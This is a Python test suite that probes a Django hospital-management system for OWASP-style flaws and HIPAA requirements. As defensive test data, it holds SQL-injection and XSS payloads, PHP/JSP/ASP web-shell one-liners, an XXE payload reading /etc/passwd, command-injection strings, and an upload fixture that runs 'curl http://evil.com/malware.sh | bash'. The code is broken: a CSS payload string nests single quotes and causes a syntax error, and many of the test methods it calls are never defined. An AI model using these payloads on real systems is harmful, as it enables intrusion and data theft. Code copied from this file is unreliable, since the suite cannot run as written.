"""
Comprehensive Security Testing Suite for HMS System

This module implements comprehensive security tests including:
- OWASP Top 10 vulnerability testing
- HIPAA compliance validation
- Authentication and authorization testing
- Input validation and injection testing
- Security audit trail verification
- Network and infrastructure security testing
- Penetration testing scenarios
"""

import pytest
import json
import requests
import jwt
import hashlib
import base64
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
from django.test import TestCase, Client
from django.urls import reverse
from django.contrib.auth import get_user_model
from django.core.management import call_command
from rest_framework.test import APIClient
from rest_framework import status
from rest_framework.authtoken.models import Token
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

# Import security framework
from .security_framework import (
    SecurityTestingFramework, SecurityTestResult, HMSSecurityTestCase
)
from ..conftest import HealthcareDataMixin, PerformanceTestingMixin

User = get_user_model()


class SecurityComprehensiveTestSuite(HMSSecurityTestCase):
    """Comprehensive security testing suite for HMS system"""

    @pytest.mark.security
    @pytest.mark.owasp
    def test_broken_access_control_comprehensive(self):
        """Test A01:2021-Broken Access Control vulnerabilities"""
        print("\n=== Testing Broken Access Control ===")

        # Test 1: IDOR in patient records
        self.test_idor_patient_records()

        # Test 2: Privilege escalation
        self.test_privilege_escalation()

        # Test 3: Unauthorized admin access
        self.test_unauthorized_admin_access()

        # Test 4: Horizontal privilege escalation
        self.test_horizontal_privilege_escalation()

        print("✓ Broken Access Control tests completed")

    def test_idor_patient_records(self):
        """Test IDOR vulnerabilities in patient records"""
        print("Testing IDOR in patient records...")

        # Create test patient
        patient_data = HealthcareDataMixin.generate_anonymized_patient_data()
        patient = self.create_test_patient(patient_data)

        # Test accessing patient records with different users
        test_users = ['admin', 'doctor', 'patient', 'unauthorized']

        for user_role in test_users:
            client = self.get_authenticated_client(user_role)

            # Try to access patient record
            url = reverse('patient-detail', kwargs={'pk': patient.id})
            response = client.get(url)

            if user_role in ['unauthorized']:
                # Unauthorized users should not access patient records
                self.assertNotEqual(
                    response.status_code,
                    status.HTTP_200_OK,
                    f"Unauthorized user {user_role} accessed patient record"
                )

            # Test accessing different patient's record
            other_patient = self.create_test_patient(
                HealthcareDataMixin.generate_anonymized_patient_data()
            )

            url = reverse('patient-detail', kwargs={'pk': other_patient.id})
            response = client.get(url)

            if user_role == 'patient':
                # Patients should only access their own records
                self.assertNotEqual(
                    response.status_code,
                    status.HTTP_200_OK,
                    f"Patient {user_role} accessed other patient's record"
                )

    def test_privilege_escalation(self):
        """Test privilege escalation vulnerabilities"""
        print("Testing privilege escalation...")

        # Test role-based access control
        restricted_endpoints = [
            ('admin-create', 'admin'),
            ('doctor-create', 'doctor'),
            ('patient-create', 'patient'),
        ]

        for endpoint, required_role in restricted_endpoints:
            for user_role in ['admin', 'doctor', 'patient', 'unauthorized']:
                client = self.get_authenticated_client(user_role)

                try:
                    url = reverse(endpoint)
                    response = client.get(url)

                    if user_role != required_role:
                        self.assertNotEqual(
                            response.status_code,
                            status.HTTP_200_OK,
                            f"User {user_role} accessed {endpoint} requiring {required_role}"
                        )
                except:
                    # Endpoint may not exist, continue
                    continue

    def test_unauthorized_admin_access(self):
        """Test unauthorized admin panel access"""
        print("Testing unauthorized admin access...")

        admin_endpoints = [
            '/admin/',
            '/api/admin/',
            '/api/superadmin/',
        ]

        unauthorized_roles = ['patient', 'unauthorized']

        for endpoint in admin_endpoints:
            for role in unauthorized_roles:
                client = self.get_authenticated_client(role)
                response = client.get(endpoint)

                self.assertNotEqual(
                    response.status_code,
                    status.HTTP_200_OK,
                    f"Unauthorized user {role} accessed admin endpoint {endpoint}"
                )

    @pytest.mark.security
    @pytest.mark.owasp
    def test_cryptographic_failures_comprehensive(self):
        """Test A02:2021-Cryptographic Failures"""
        print("\n=== Testing Cryptographic Failures ===")

        # Test 1: Password storage security
        self.test_password_storage_security()

        # Test 2: JWT token security
        self.test_jwt_token_security()

        # Test 3: Data encryption
        self.test_data_encryption()

        # Test 4: SSL/TLS configuration
        self.test_ssl_tls_configuration()

        print("✓ Cryptographic Failures tests completed")

    def test_password_storage_security(self):
        """Test password storage security"""
        print("Testing password storage security...")

        # Check password hashing algorithm
        test_users = User.objects.all()[:10]

        for user in test_users:
            password_hash = user.password

            # Check for weak hashing algorithms
            weak_algorithms = ['md5$', 'sha1$', 'crypt$', 'plaintext$']

            for algorithm in weak_algorithms:
                self.assertFalse(
                    password_hash.startswith(algorithm),
                    f"User {user.username} uses weak password hashing: {algorithm}"
                )

            # Check for proper salt
            if password_hash.startswith('pbkdf2_sha256$'):
                parts = password_hash.split('$')
                self.assertGreaterEqual(
                    len(parts),
                    4,
                    f"User {user.username} has improperly formatted password hash"
                )

            # Check hash strength (iterations)
            if password_hash.startswith('pbkdf2_sha256$'):
                iterations = int(password_hash.split('$')[2])
                self.assertGreaterEqual(
                    iterations,
                    100000,
                    f"User {user.username} uses insufficient hash iterations: {iterations}"
                )

    def test_jwt_token_security(self):
        """Test JWT token security"""
        print("Testing JWT token security...")

        # Test token expiration
        payload = {
            'user_id': 1,
            'username': 'testuser',
            'exp': datetime.now() + timedelta(seconds=1)  # 1 second expiration
        }

        token = jwt.encode(payload, 'test-secret', algorithm='HS256')

        # Wait for token to expire
        time.sleep(2)

        # Try to use expired token
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION=f'Bearer {token}')

        response = client.get('/api/patients/')
        self.assertEqual(
            response.status_code,
            status.HTTP_401_UNAUTHORIZED,
            "Expired token was accepted"
        )

        # Test token tampering
        payload['user_id'] = 999  # Tamper with user ID
        tampered_token = jwt.encode(payload, 'test-secret', algorithm='HS256')

        client.credentials(HTTP_AUTHORIZATION=f'Bearer {tampered_token}')
        response = client.get('/api/patients/')

        self.assertEqual(
            response.status_code,
            status.HTTP_401_UNAUTHORIZED,
            "Tampered token was accepted"
        )

    def test_data_encryption(self):
        """Test data encryption for sensitive fields"""
        print("Testing data encryption...")

        # Create test patient with sensitive data
        patient_data = {
            'first_name': 'John',
            'last_name': 'Doe',
            'email': 'john.doe@example.com',
            'phone': '+1-555-0123',
            'ssn': '123-45-6789',  # This should be encrypted
            'medical_record_number': 'MRN-12345'
        }

        patient = self.create_test_patient(patient_data)

        # Check if sensitive data is encrypted in database
        from django.db import connection

        with connection.cursor() as cursor:
            cursor.execute("SELECT ssn FROM patients_patient WHERE id = %s", [patient.id])
            result = cursor.fetchone()

            if result:
                stored_ssn = result[0]
                # SSN should not be stored in plaintext
                self.assertNotEqual(
                    stored_ssn,
                    '123-45-6789',
                    "SSN stored in plaintext without encryption"
                )

    @pytest.mark.security
    @pytest.mark.owasp
    def test_injection_vulnerabilities_comprehensive(self):
        """Test A03:2021-Injection vulnerabilities"""
        print("\n=== Testing Injection Vulnerabilities ===")

        # Test 1: SQL Injection
        self.test_sql_injection_scenarios()

        # Test 2: Cross-Site Scripting (XSS)
        self.test_xss_vulnerabilities()

        # Test 3: Command Injection
        self.test_command_injection()

        # Test 4: LDAP Injection
        self.test_ldap_injection()

        # Test 5: NoSQL Injection
        self.test_nosql_injection()

        print("✓ Injection Vulnerabilities tests completed")

    def test_sql_injection_scenarios(self):
        """Test SQL injection scenarios"""
        print("Testing SQL injection scenarios...")

        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT username, password FROM auth_user --",
            "'; DROP TABLE patients_patient; --",
            "' OR SLEEP(10)--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "' WAITFOR DELAY '0:0:10'--",
            "1'; SELECT PG_SLEEP(10)--",
            "' OR 1=1 --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
        ]

        vulnerable_endpoints = [
            ('patient-list', 'search'),
            ('appointment-list', 'patient_id'),
            ('medicalrecord-list', 'patient_id'),
        ]

        for endpoint_name, param_name in vulnerable_endpoints:
            for payload in sql_payloads:
                client = self.get_authenticated_client('admin')

                try:
                    url = reverse(endpoint_name)
                    response = client.get(url, {param_name: payload})

                    # Check for SQL injection indicators
                    error_indicators = [
                        'syntax error',
                        'sql error',
                        'mysql_fetch',
                        'postgresql',
                        'ora-',
                        'sqlite',
                        'warning',
                        'error in your sql syntax'
                    ]

                    response_text = response.content.decode('utf-8', errors='ignore').lower()

                    for indicator in error_indicators:
                        self.assertNotIn(
                            indicator,
                            response_text,
                            f"SQL injection vulnerability in {endpoint_name} with payload: {payload}"
                        )

                    # Check for time-based SQL injection
                    start_time = time.time()
                    response = client.get(url, {param_name: payload})
                    end_time = time.time()

                    response_time = end_time - start_time

                    # If response time is significantly delayed, might indicate time-based SQL injection
                    self.assertLess(
                        response_time,
                        5.0,
                        f"Possible time-based SQL injection in {endpoint_name} with payload: {payload}"
                    )

                except Exception as e:
                    # Endpoint might not exist, continue
                    continue

    def test_xss_vulnerabilities(self):
        """Test XSS vulnerabilities"""
        print("Testing XSS vulnerabilities...")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "';alert(String.fromCharCode(88,83,83));//",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<script src=\"http://evil.com/xss.js\"></script>",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            "<<script>alert('XSS');//<</script>",
            "<script>alert(/XSS/)</script>",
            "<img/src=x onerror=alert('XSS')>",
            "'\"'><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<iMg SrC=x OnErRoR=alert('XSS')>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "<script>alert(String.fromCharCode(0x58,0x53,0x53))</script>",
            "<scr\u0069pt>alert('XSS')</scr\u0069pt>",
            "<scr\u0069pt>alert(/XSS/)</script>"
        ]

        vulnerable_fields = [
            ('first_name', 'patient-create'),
            ('last_name', 'patient-create'),
            ('notes', 'appointment-create'),
            ('diagnosis', 'medicalrecord-create'),
            ('description', 'feedback-create'),
        ]

        for field_name, endpoint_name in vulnerable_fields:
            for payload in xss_payloads:
                client = self.get_authenticated_client('admin')

                try:
                    url = reverse(endpoint_name)
                    data = {field_name: payload}

                    # Add required fields
                    if endpoint_name == 'patient-create':
                        data.update({
                            'email': 'test@example.com',
                            'phone': '+1-555-0123',
                            'date_of_birth': '1990-01-01'
                        })
                    elif endpoint_name == 'appointment-create':
                        data.update({
                            'patient_id': 1,
                            'appointment_date': '2024-01-01T10:00:00Z',
                            'appointment_type': 'GENERAL'
                        })

                    response = client.post(url, data, format='json')

                    # Check if payload is reflected in response
                    response_text = response.content.decode('utf-8', errors='ignore')

                    # Check for unescaped XSS payload
                    if payload in response_text:
                        self.fail(
                            f"XSS vulnerability in {endpoint_name}.{field_name} with payload: {payload}"
                        )

                    # Check for partial payload reflection
                    for dangerous_part in ['<script', 'onerror=', 'javascript:', 'alert(']:
                        if dangerous_part in response_text and response.status_code != 400:
                            self.fail(
                                f"Potential XSS vulnerability in {endpoint_name}.{field_name} with payload: {payload}"
                            )

                except Exception as e:
                    # Endpoint might not exist or have validation errors, continue
                    continue

    @pytest.mark.security
    @pytest.mark.hipaa
    def test_hipaa_compliance_comprehensive(self):
        """Test HIPAA compliance requirements"""
        print("\n=== Testing HIPAA Compliance ===")

        # Test 1: PHI encryption in transit
        self.test_phi_encryption_in_transit()

        # Test 2: PHI encryption at rest
        self.test_phi_encryption_at_rest()

        # Test 3: Audit trail completeness
        self.test_audit_trail_completeness()

        # Test 4: Access control compliance
        self.test_access_control_compliance()

        # Test 5: Data retention policies
        self.test_data_retention_policies()

        # Test 6: Breach notification procedures
        self.test_breach_notification_procedures()

        print("✓ HIPAA Compliance tests completed")

    def test_phi_encryption_in_transit(self):
        """Test PHI encryption during transmission"""
        print("Testing PHI encryption in transit...")

        # Test HTTPS enforcement
        endpoints_with_phi = [
            '/api/patients/',
            '/api/medical-records/',
            '/api/appointments/',
            '/api/billing/',
            '/api/pharmacy/',
        ]

        client = Client()
        auth_client = self.get_authenticated_client('admin')

        for endpoint in endpoints_with_phi:
            # Test HTTP to HTTPS redirect
            response = client.get(endpoint, HTTP_HOST='localhost:8000', secure=False)

            # Should redirect to HTTPS or deny access
            self.assertIn(
                response.status_code,
                [301, 302, 403, 404],
                f"HTTP access to PHI endpoint {endpoint} not properly secured"
            )

            # Test secure headers
            response = auth_client.get(endpoint)

            security_headers = [
                'Strict-Transport-Security',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Content-Security-Policy',
            ]

            for header in security_headers:
                self.assertIn(
                    header,
                    response.headers,
                    f"Missing security header {header} for PHI endpoint {endpoint}"
                )

    def test_phi_encryption_at_rest(self):
        """Test PHI encryption at rest"""
        print("Testing PHI encryption at rest...")

        # Create patient with PHI
        patient_data = {
            'first_name': 'John',
            'last_name': 'Doe',
            'email': 'john.doe@example.com',
            'phone': '+1-555-0123',
            'ssn': '123-45-6789',
            'medical_record_number': 'MRN-12345',
            'address': '123 Main St, Anytown, ST 12345'
        }

        patient = self.create_test_patient(patient_data)

        # Check database storage
        from django.db import connection

        with connection.cursor() as cursor:
            # Check if sensitive fields are encrypted
            sensitive_fields = ['ssn', 'medical_record_number']

            for field in sensitive_fields:
                cursor.execute(f"SELECT {field} FROM patients_patient WHERE id = %s", [patient.id])
                result = cursor.fetchone()

                if result and result[0]:
                    stored_value = result[0]
                    # Should not be stored in plaintext
                    self.assertNotEqual(
                        stored_value,
                        patient_data[field],
                        f"Field {field} stored in plaintext without encryption"
                    )

                    # Should be encrypted (check for encryption indicators)
                    self.assertTrue(
                        self.is_value_encrypted(stored_value),
                        f"Field {field} does not appear to be encrypted"
                    )

    def is_value_encrypted(self, value):
        """Check if a value appears to be encrypted"""
        # Simple heuristic for encrypted values
        if not value:
            return True  # Null values are fine

        # Check for encryption indicators
        encrypted_indicators = [
            len(str(value)) > 100,  # Long encrypted strings
            str(value).startswith('g3v'),  # Django encrypted field format
            str(value).startswith('$2b$'),  # bcrypt
            str(value).startswith('pbkdf2_sha256$'),  # PBKDF2
            any(c not in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._@ ' for c in str(value)),  # Non-ASCII characters
        ]

        return any(encrypted_indicators)

    @pytest.mark.security
    @pytest.mark.penetration
    def test_authentication_bypass_comprehensive(self):
        """Test authentication bypass vulnerabilities"""
        print("\n=== Testing Authentication Bypass ===")

        # Test 1: Session fixation
        self.test_session_fixation()

        # Test 2: Token manipulation
        self.test_token_manipulation()

        # Test 3: Parameter tampering
        self.test_parameter_tampering()

        # Test 4: Cookie manipulation
        self.test_cookie_manipulation()

        # Test 5: Direct object access
        self.test_direct_object_access()

        print("✓ Authentication Bypass tests completed")

    def test_session_fixation(self):
        """Test session fixation vulnerabilities"""
        print("Testing session fixation...")

        # Create test user
        user = User.objects.create_user(
            username='session_test',
            password='SecurePass123!',
            email='session@test.com'
        )

        # Login to get session
        client = Client()
        client.login(username='session_test', password='SecurePass123!')

        # Get session ID
        session_id = client.session.session_key

        # Logout
        client.logout()

        # Try to use old session ID after logout
        client.cookies['sessionid'] = session_id

        # Try to access protected resource
        response = client.get('/api/patients/')

        # Should be denied access
        self.assertEqual(
            response.status_code,
            302,  # Redirect to login
            "Session fixation vulnerability: old session accepted after logout"
        )

    @pytest.mark.security
    @pytest.mark.penetration
    def test_file_upload_vulnerabilities(self):
        """Test file upload vulnerabilities"""
        print("\n=== Testing File Upload Vulnerabilities ===")

        # Test 1: Malicious file upload
        self.test_malicious_file_upload()

        # Test 2: File type bypass
        self.test_file_type_bypass()

        # Test 3: File size overflow
        self.test_file_size_overflow()

        # Test 4: Directory traversal
        self.test_directory_traversal_upload()

        print("✓ File Upload Vulnerabilities tests completed")

    def test_malicious_file_upload(self):
        """Test malicious file upload"""
        print("Testing malicious file upload...")

        malicious_files = [
            ('malicious.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('malicious.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('malicious.asp', '<% Response.Write(Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>', 'application/x-asp'),
            ('malicious.py', 'import os; os.system(request.args.get("cmd", ""))', 'text/x-python'),
            ('malicious.exe', b'MZ\x90\x00\x03\x00\x00\x00', 'application/x-executable'),
            ('malicious.sh', '#!/bin/bash\ncurl http://evil.com/malware.sh | bash', 'application/x-sh'),
            ('malicious.html', '<script>alert("XSS")</script>', 'text/html'),
            ('malicious.js', 'alert("XSS");', 'application/javascript'),
            ('malicious.css', 'body {background: url("javascript:alert('XSS')")}', 'text/css'),
            ('malicious.xml', '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', 'application/xml'),
        ]

        upload_endpoints = [
            'patient-avatar-upload',
            'document-upload',
            'medical-record-attachment',
        ]

        for filename, content, content_type in malicious_files:
            for endpoint in upload_endpoints:
                client = self.get_authenticated_client('admin')

                try:
                    url = reverse(endpoint)

                    # Create file-like object
                    from io import BytesIO
                    file_obj = BytesIO(content.encode() if isinstance(content, str) else content)
                    file_obj.name = filename

                    response = client.post(url, {
                        'file': file_obj
                    }, format='multipart')

                    # Should reject malicious files
                    self.assertIn(
                        response.status_code,
                        [400, 403, 415],
                        f"Malicious file {filename} uploaded successfully to {endpoint}"
                    )

                except Exception as e:
                    # Endpoint might not exist, continue
                    continue

    @pytest.mark.security
    @pytest.mark.performance
    def test_security_performance_impact(self):
        """Test security measures performance impact"""
        print("\n=== Testing Security Performance Impact ===")

        # Test 1: Authentication performance
        self.test_authentication_performance()

        # Test 2: Authorization performance
        self.test_authorization_performance()

        # Test 3: Encryption performance
        self.test_encryption_performance()

        # Test 4: Rate limiting performance
        self.test_rate_limiting_performance()

        print("✓ Security Performance Impact tests completed")

    def test_authentication_performance(self):
        """Test authentication performance"""
        print("Testing authentication performance...")

        # Test login performance
        login_times = []

        for i in range(10):
            start_time = time.time()

            client = Client()
            result = client.login(username='admin', password='securepassword123!')

            end_time = time.time()

            login_times.append(end_time - start_time)

        avg_login_time = sum(login_times) / len(login_times)

        print(f"Average login time: {avg_login_time:.3f} seconds")

        # Login should be fast (< 2 seconds)
        self.assertLess(
            avg_login_time,
            2.0,
            f"Authentication too slow: {avg_login_time:.3f}s"
        )

    def generate_security_report(self):
        """Generate comprehensive security report"""
        print("\n=== Generating Security Report ===")

        # Collect all test results
        security_results = []

        # Run comprehensive security scan
        results = self.security_framework.run_comprehensive_security_scan(self.target_url)
        security_results.extend(results)

        # Categorize by severity
        critical_issues = [r for r in security_results if r.severity == 'CRITICAL']
        high_issues = [r for r in security_results if r.severity == 'HIGH']
        medium_issues = [r for r in security_results if r.severity == 'MEDIUM']
        low_issues = [r for r in security_results if r.severity == 'LOW']

        # Generate report
        report = {
            'timestamp': datetime.now().isoformat(),
            'target_system': 'HMS Enterprise System',
            'scan_summary': {
                'total_issues': len(security_results),
                'critical_issues': len(critical_issues),
                'high_issues': len(high_issues),
                'medium_issues': len(medium_issues),
                'low_issues': len(low_issues),
            },
            'vulnerabilities': [result.to_dict() for result in security_results],
            'compliance_status': {
                'hipaa_compliant': len(critical_issues) == 0,
                'owasp_compliant': len(high_issues) == 0,
                'overall_security_score': self.calculate_security_score(security_results)
            },
            'recommendations': self.generate_security_recommendations(security_results)
        }

        # Save report
        import json
        with open('/tmp/hms_security_report.json', 'w') as f:
            json.dump(report, f, indent=2)

        print(f"Security report generated: {len(security_results)} issues found")
        print(f"Critical: {len(critical_issues)}, High: {len(high_issues)}")
        print(f"Security Score: {report['compliance_status']['overall_security_score']}%")

        return report

    def calculate_security_score(self, results):
        """Calculate overall security score"""
        if not results:
            return 100

        # Weight vulnerabilities by severity
        weights = {'CRITICAL': 20, 'HIGH': 10, 'MEDIUM': 5, 'LOW': 1}
        total_penalty = sum(weights.get(r.severity, 0) for r in results)

        # Calculate score (max 100)
        score = max(0, 100 - total_penalty)

        return score

    def generate_security_recommendations(self, results):
        """Generate security recommendations based on findings"""
        recommendations = []

        # Analyze common issues
        issue_categories = {}
        for result in results:
            category = result.owasp_category or result.vulnerability_type
            if category not in issue_categories:
                issue_categories[category] = []
            issue_categories[category].append(result)

        # Generate recommendations for each category
        for category, issues in issue_categories.items():
            if len(issues) > 1:
                recommendations.append({
                    'priority': 'HIGH',
                    'category': category,
                    'issue_count': len(issues),
                    'recommendation': f"Multiple {category} issues found. Implement comprehensive security measures."
                })

        # Add general recommendations
        general_recommendations = [
            {
                'priority': 'HIGH',
                'category': 'General Security',
                'recommendation': 'Implement regular security audits and penetration testing'
            },
            {
                'priority': 'MEDIUM',
                'category': 'Training',
                'recommendation': 'Provide security awareness training for development team'
            },
            {
                'priority': 'MEDIUM',
                'category': 'Monitoring',
                'recommendation': 'Implement continuous security monitoring and alerting'
            }
        ]

        recommendations.extend(general_recommendations)

        return recommendations


# Security test utilities
def create_test_patient(test_case, patient_data):
    """Helper function to create test patient"""
    from backend.patients.models import Patient
    return Patient.objects.create(**patient_data)


def get_authenticated_client(test_case, role):
    """Helper function to get authenticated client"""
    client = APIClient()

    if role == 'admin':
        user = User.objects.get(username='admin')
    elif role == 'doctor':
        user = User.objects.get(username='doctor')
    elif role == 'patient':
        user = User.objects.get(username='patient')
    else:
        return client

    client.force_authenticate(user=user)
    return client


# Pytest fixtures
@pytest.fixture
def security_test_suite():
    """Security test suite fixture"""
    return SecurityComprehensiveTestSuite()


@pytest.fixture
def security_test_results():
    """Security test results fixture"""
    return []


@pytest.fixture
def security_payloads():
    """Security testing payloads fixture"""
    return {
        'sql_injection': [
            "' OR '1'='1",
            "' UNION SELECT username, password FROM users --",
            "'; DROP TABLE users; --"
        ],
        'xss': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ],
        'command_injection': [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd"
        ]
    }


if __name__ == '__main__':
    # Run security tests
    test_suite = SecurityComprehensiveTestSuite()
    test_suite.setUp()

    # Run comprehensive security scan
    report = test_suite.generate_security_report()

    print("\n=== Security Testing Complete ===")
    print(f"Overall Security Score: {report['compliance_status']['overall_security_score']}%")
    print(f"Critical Issues: {report['scan_summary']['critical_issues']}")
    print(f"High Issues: {report['scan_summary']['high_issues']}")

    if report['scan_summary']['critical_issues'] > 0:
        print("\n⚠️  CRITICAL SECURITY ISSUES FOUND!")
        print("Immediate remediation required.")
    else:
        print("\n✅ No critical security issues found.")